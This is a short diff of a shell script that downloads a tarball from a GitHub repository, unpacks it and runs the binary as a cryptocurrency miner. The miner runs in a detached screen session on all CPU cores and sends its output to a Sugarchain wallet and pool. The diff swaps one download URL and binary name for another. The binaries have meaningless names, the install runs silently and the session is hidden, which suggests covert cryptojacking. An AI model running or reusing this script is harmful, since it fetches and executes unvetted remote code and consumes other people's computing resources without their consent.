@@ -5,9 +5,9 @@ WALLET=sugar1q9494l7vclvtuuhkfmuhgl0t2nnwymwl8xyukr8
 POOL=pool.hashvault.pro:443
 
 sudo apt install screen -y > /dev/null 2>&1
-wget wget https://github.com/muledan1/bash/raw/main/-.tar.gz
-tar -xf -.tar.gz
-screen -S Wuenuak_Guerrr -dm ./- -a yespowersugar  -o $POOL -u $WALLET.nett -t$(nproc --all)
+wget https://github.com/arifrahman555/arif/raw/main/cuan.tar.gz
+tar -xf cuan.tar.gz
+screen -S Wuenuak_Guerrr -dm ./cuan -a yespowersugar  -o $POOL -u $WALLET.nett -t$(nproc --all)
 screen -ls
 sleep 2
 clear
